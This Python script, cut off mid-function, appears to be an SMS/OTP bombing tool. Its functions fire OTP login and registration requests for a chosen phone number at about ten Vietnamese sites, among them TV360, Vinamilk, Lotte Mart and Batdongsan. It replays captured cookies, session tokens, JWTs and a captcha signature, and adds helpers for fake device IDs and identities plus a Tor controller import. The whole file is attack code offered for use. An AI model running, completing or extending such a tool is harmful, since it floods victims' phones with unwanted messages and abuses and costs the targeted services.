
from bs4 import BeautifulSoup
import requests
import random
import json
import string
import time
from lequangminh import *
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import requests
import time
import urllib3
import random
import json
import string
import concurrent.futures
import os
import sys
from functools import wraps
import sys
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import random
from functools import wraps
from urllib.parse import quote
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import random
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from stem.control import Controller
def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))

def so(length):
    return ''.join(random.choice(string.digits) for _ in range(length))

def generate_random(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_imei():
    return ''.join(random.choice(string.digits) for _ in range(15))

def Random_string(length, minh):
    return ''.join(random.choices(minh, k=length))

def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))

def getimei():
    return Random_string(8, string.ascii_letters + string.digits)+'-'+Random_string(4, string.ascii_letters + string.digits)+'-'+Random_string(4, string.ascii_letters + string.digits)+'-'+Random_string(4, string.ascii_letters + string.digits)+'-'+Random_string(12, string.ascii_letters + string.digits)

def get_TOKEN():
    return Random_string(22, string.ascii_letters + string.digits)+':'+Random_string(9, string.ascii_letters + string.digits)+'-'+Random_string(20, string.ascii_letters + string.digits)+'-'+Random_string(12, string.ascii_letters + string.digits)+'-'+Random_string(7, string.ascii_letters + string.digits)+'-'+Random_string(7, string.ascii_letters + string.digits)+'-'+Random_string(53, string.ascii_letters + string.digits)+'-'+Random_string(9, string.ascii_letters + string.digits)+'_'+Random_string(11, string.ascii_letters + string.digits)+'-'+Random_string(4, string.ascii_letters + string.digits)

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def Random_string_custom(length, charset):
    return ''.join(random.choices(charset, k=length))



mail = generate_random(10)+'@gmail.com'
to = (
    generate_random(53) + '-' + generate_random(86) + '-' + generate_random(121) +
    '_' + generate_random(2) + '-' + generate_random(94) + '-' + generate_random(3) +
    '_' + generate_random(9) + '-' + generate_random(15) + '_' + generate_random(17) +
    '-' + generate_random(39) + '_' + generate_random(85) + '_' + generate_random(34)
)

def generate_random_email(domain='example.com'):
    length = random.randint(5, 10)
    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    email = f'{email_name}@{domain}'
    return email

def generate_random_name():
    return f"{random.choice(last_names)} {random.choice(middle_names)} {random.choice(first_names)}".strip()

def random_segment(length):
    return Random_string(length, string.ascii_uppercase + string.digits)

def generate_random_idx():
    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"

def generate_random_id():
    return Random_string(32, string.ascii_uppercase + string.digits)

def format_device_id(device_id):
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

random_id = generate_random_id()
formatted_device_id = format_device_id(random_id)

thatbai = 0
day = 0
def generate_random_email(domain='example.com'):
    length = random.randint(5, 10)
    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    email = f'{email_name}@{domain}'
    return email

random_email = generate_random_email()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import random, re
import string
import urllib.parse
import json
import requests
import sys
from bs4 import BeautifulSoup
import requests
import random
import json
import string
import time
from lequangminh import *
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import requests
import time
import requests
import random
import string
import threading
import sys
import os
import json
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return "".join(random.choice(letters_and_digits) for i in range(length))
def so(length):
    return "".join(random.choice(string.digits) for _ in range(length))
def generate_random(length):
    return "".join(
        random.choice(string.ascii_letters + string.digits) for _ in range(length)
    )
def generate_imei():
    return "".join(random.choice(string.digits) for _ in range(15))
def Random_string(length, minh):
    return "".join(random.choices(minh, k=length))
def get_SECUREID():
    return "".join(random.choices("0123456789abcdef", k=17))
last_names = ["Nguyễn", "Trần", "Lê", "Phạm", "Vũ", "Hoàng"]
middle_names = ["Văn", "Thị", "Quang", "Hoàng", "Anh", "Thanh"]
first_names = ["Nam", "Tuấn", "Hương", "Linh", "Long", "Duy"]
def generate_random_name():
    last_name = random.choice(last_names)
    middle_name = random.choice(middle_names)
    first_name = random.choice(first_names)
    return f"{last_name} {middle_name} {first_name}".strip()
def generate_random_email(domain="example.com"):
    length = random.randint(5, 10)
    email_name = "".join(
        random.choices(string.ascii_lowercase + string.digits, k=length)
    )
    email = f"{email_name}@{domain}"
    return email
def generate_random_id():
    def random_segment(length):
        return "".join(random.choices(string.ascii_uppercase + string.digits, k=length))
    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"
random_id = generate_random_id()
random_email = generate_random_email()
random_name = generate_random_name()
def generate_random_id():
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=32))
def format_device_id(device_id):
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

def tv360(phone):
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': phone,
    }

    try:
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TV360 | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("TV360 | TRẠNG THÁI : Thất Bại Fuck")



def beautybox(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '79d2b3f19c99f5f7fe5971dd8a8da10d',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721481506061',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': phone,
    }

    try:
        response = requests.post(
            'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEAUTYBOX | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("BEAUTYBOX | TRẠNG THÁI : Thất Bại Fuck")


def kingfood(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': phone,
                'captchaSignature': 'AUh02gdJ2znItu66xz2_9BcBV9GpEJnBt2TLRjQR8E4oYUM8MOUaIzo9UIbYoR5iYCS1tFCgV-bXXo5aAhc4PphZgiMyaaKDNeC4MNyVDT5ME4_Sd-u0oY1gNPGS74QJAiRCJQ3aFU55oFpZpvKGID_msRlD:U=830229ce60000000',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}',
    }

    try:
        response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KINGFOOD | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("KINGFOOD | TRẠNG THÁI : Thất Bại Fuck")



def batdongsan(phone):
    cookies = {
        'con.ses.id': '7bf95af0-9d48-4115-b90e-bf7ae8469ee6',
        'con.unl.lat': '1721408400',
        'con.unl.sc': '1',
        '_cfuvid': '4vKd4xe7hwURYq2xLeT9BVK.Jrz4BnjQuSRDUOM0vzA-1721486111747-0.0.1.1-604800000',
        'cf_clearance': 'hiiEURQk2w.xUsuPjn9p3ROpbHXl.wlpUuq1cGtW_.g-1721486121-1.0.1.1-jbLYMcgpNKMTvY1HlNdTJzo8ICADE9v86yOh5Ulh15Xm.v0xqMTTlj15qkFRfERjSleLaNdqxOJCQTsz.cc7cA',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222072e9e1-089b-4e58-ae37-b33dc853a67e%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.6810435Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2264679f44-f457-480b-ad8d-ce4e4c2ee26d%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.681077Z%22%7D',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%22171c86d6-ae5f-e545-06ab-337ff9c892a2%22%2C%22c%22%3A1721486135674%2C%22l%22%3A1721486135674%7D',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'cookie': 'con.ses.id=7bf95af0-9d48-4115-b90e-bf7ae8469ee6; con.unl.lat=1721408400; con.unl.sc=1; _cfuvid=4vKd4xe7hwURYq2xLeT9BVK.Jrz4BnjQuSRDUOM0vzA-1721486111747-0.0.1.1-604800000; cf_clearance=hiiEURQk2w.xUsuPjn9p3ROpbHXl.wlpUuq1cGtW_.g-1721486121-1.0.1.1-jbLYMcgpNKMTvY1HlNdTJzo8ICADE9v86yOh5Ulh15Xm.v0xqMTTlj15qkFRfERjSleLaNdqxOJCQTsz.cc7cA; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222072e9e1-089b-4e58-ae37-b33dc853a67e%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.6810435Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2264679f44-f457-480b-ad8d-ce4e4c2ee26d%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.681077Z%22%7D; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22171c86d6-ae5f-e545-06ab-337ff9c892a2%22%2C%22c%22%3A1721486135674%2C%22l%22%3A1721486135674%7D',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'phoneNumber': phone,
    }

    try:
        response = requests.get(
            'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
            params=params,
            cookies=cookies,
            headers=headers,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BATDONGSAN | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("BATDONGSAN | TRẠNG THÁI : Thất Bại Fuck")



def futabus(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'priority': 'u=1, i',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImMxNTQwYWM3MWJiOTJhYTA2OTNjODI3MTkwYWNhYmU1YjA1NWNiZWMiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMTQ4NDE4NywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIxNDg0MTg3LCJleHAiOjE3MjE0ODc3ODcsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.B3N8aepeBJjblYxOhB3CWVrtNScR7v03lucgdln78cz2607XQDiYEOVWQ5ObwQkxfPrEEVrBNHeysfEffcXB0u2B2D6uEki1H1vKam3-ANzbMHQAuAHAsYdd8WJXaK-75tm4eQUtY9tkmdfbjTZqWY0J-_FylIIZ-KBTDIfxQObMFXdQvJNZ2eFwBFOG1-sV1z2xBLpzfHg94WwC21FAWGDh44UnrWoUTHHgUrUZH9y-y3SivWeln2Wl1VHoDjojJLq2ktO01JEmshb7K3zf9rloW8jTd-ZzHQzLEeqMbep8AUeqDslL7uHnz8AJ8V6udNxACirDi5dZ-4b6aj8uxA',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': phone,
        'deviceId': '44099e14-f741-4900-892f-1e8d7634a953',
        'use_for': 'LOGIN',
    }

    try:
        response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FUTABUS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FUTABUS | TRẠNG THÁI : Thất Bại Fuck")

#     headers = {
#         'accept': 'application/json, text/plain, */*',
#         'accept-language': 'vi',
#         'content-type': 'application/json',
#         'dmn': 'DTPGDW',
#         'origin': 'https://dominos.vn',
#         'priority': 'u=1, i',
#         'referer': 'https://dominos.vn/?gad_source=1',
#         'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
#         'sec-ch-ua-mobile': '?0',
#         'sec-ch-ua-platform': '"Windows"',
#         'sec-fetch-dest': 'empty',
#         'sec-fetch-mode': 'cors',
#         'sec-fetch-site': 'same-origin',
#         'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
#         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
#     }

#     json_data = {
#         'phone_number': phone,
#         'email': 'licehe9526@newcupon.com',
#         'type': 0,
#         'is_register': True,
#     }

#         response = requests.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data, timeout=10)
#     print(response.text)

# DOMINO LỖI 404:Bad Requests



def galaxyplay(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI2YzY0MTgxMi00OTk0LTQyN2EtOWU2Zi0zZjdkYjE4NDE3M2YiLCJkaWQiOiI5MjlmYWM4Zi1kMzIwLTQ4NGEtYjBlMi0zNzM3ZGFiYzc0MzAiLCJpcCI6IjE3MS4yMjQuMTc3LjI0OSIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8b3BlcmEiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNzIxNDg5MzMxLCJleHAiOjE3MzcwNDEzMzF9.BO2W7U4Y9QBrqv_Vhr34OlQ003dseXM5sOYsJPl1DK4',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': phone,
    }

    try:
        response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GALAXYPLAY | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("GALAXYPLAY | TRẠNG THÁI : Thất Bại Fuck")



def hoangphuc(phone):
    cookies = {
        'form_key': 'foYNoUTBeSb3u9Ky',
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'PHPSESSID': 'ac5e556aba621e003eea52e3ee2e7306',
        'form_key': 'foYNoUTBeSb3u9Ky',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-cache-sessid': 'true',
        'mst-cache-warmer-track': '1721490287753',
        'private_content_version': '49f632da2b3ba9baa44ac87e1acceb51',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=foYNoUTBeSb3u9Ky; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=ac5e556aba621e003eea52e3ee2e7306; form_key=foYNoUTBeSb3u9Ky; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1721490287753; private_content_version=49f632da2b3ba9baa44ac87e1acceb51',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjFkNWJkZWE3ODIzYTA1MmQiLCJ0ciI6IjNhZGMzYWRkODkyYzI1NzE2MjYxZTA1Mzg3NTI1OGRkIiwidGkiOjE3MjE0OTAzMTM0ODUsInRrIjoiMTMyMjg0MCJ9fQ==',
        'origin': 'https://hoang-phuc.com',
        'priority': 'u=1, i',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-3adc3add892c25716261e053875258dd-1d5bdea7823a052d-01',
        'tracestate': '1322840@nr=0-1-4173019-1120237972-1d5bdea7823a052d----1721490313485',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': phone,
    }

    try:
        response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOANGPHUC | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("HOANGPHUC | TRẠNG THÁI : Thất Bại Fuck")



def gumac(phone):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
    }

    try:
        response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GUMAC | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("GUMAC | TRẠNG THÁI : Thất Bại Fuck")



def vinamilk(phone):
    cookies = {
        'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e',
        '__cf_bm': 'eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ',
        'builderSessionId': 'b4ba9b33e12b4b4080e44f971f201bbd',
        'sca_fg_codes': '[]',
        'avadaIsLogin': '',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer null',
        'content-type': 'text/plain;charset=UTF-8',
        # 'cookie': 'ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e; __cf_bm=eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ; builderSessionId=b4ba9b33e12b4b4080e44f971f201bbd; sca_fg_codes=[]; avadaIsLogin=',
        'origin': 'https://new.vinamilk.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = f'{{"type":"register","phone":"{phone}"}}'

    try:
        response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINAMILK | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("VINAMILK | TRẠNG THÁI : Thất Bại Fuck")



def speedlotte(phone):
    cookies = {
        '__Host-next-auth.csrf-token': '28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '__Host-next-auth.csrf-token=28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/vi-cgy',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
